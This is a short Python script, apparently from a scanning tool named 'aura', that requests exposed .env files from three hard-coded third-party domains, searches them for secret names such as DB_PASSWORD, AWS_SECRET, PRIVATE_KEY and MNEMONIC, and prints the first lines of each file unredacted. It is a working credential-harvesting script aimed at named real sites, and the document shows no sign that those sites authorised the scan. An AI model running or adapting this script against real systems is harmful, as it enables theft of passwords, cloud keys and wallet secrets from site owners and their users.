import asyncio
import httpx
import re
from aura.ui.formatter import console

async def extract_env_secrets(url):
    console.print(f"[*] Verifying CRITICAL .env exposure -> {url}")
    try:
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            r = await client.get(url)
            if r.status_code == 200:
                content = r.text
                console.print(f"  [bold red][!!!] CONFIRMED: {url} is LIVE![/bold red]")
                console.print(f"    -> Size: {len(content)} bytes")
                
                # Search for sensitive keys
                secrets = [
                    "DB_PASSWORD", "AWS_SECRET", "API_KEY", "SECRET_KEY",
                    "JWT_SECRET", "STRIPE", "SENDGRID", "MAILGUN", "DATABASE_URL",
                    "MNEMONIC", "PRIVATE_KEY"
                ]
                
                found = []
                for s in secrets:
                    if s in content.upper():
                        # Extract the line (obfuscated)
                        match = re.search(f"({s}=.*?)$", content, re.MULTILINE | re.IGNORECASE)
                        if match:
                            found.append(match.group(1).split("=")[0])
                
                if found:
                    console.print(f"    [!] Found Secrets: {', '.join(found)}")
                    # Preview the first 10 lines
                    console.print("    [.] Preview (First 5 lines):")
                    for line in content.splitlines()[:5]:
                        console.print(f"      {line}")
                return True
            else:
                console.print(f"  [yellow][.] Status: {r.status_code}[/yellow]")
    except Exception as e:
        console.print(f"  [red][!] Error: {e}[/red]")
    return False

async def main():
    targets = [
        "https://indorse.io/.env",
        "https://status.blockscout.com/.env",
        "https://app.indorse.io/.env"
    ]
    for t in targets:
        await extract_env_secrets(t)

if __name__ == "__main__":
    asyncio.run(main())
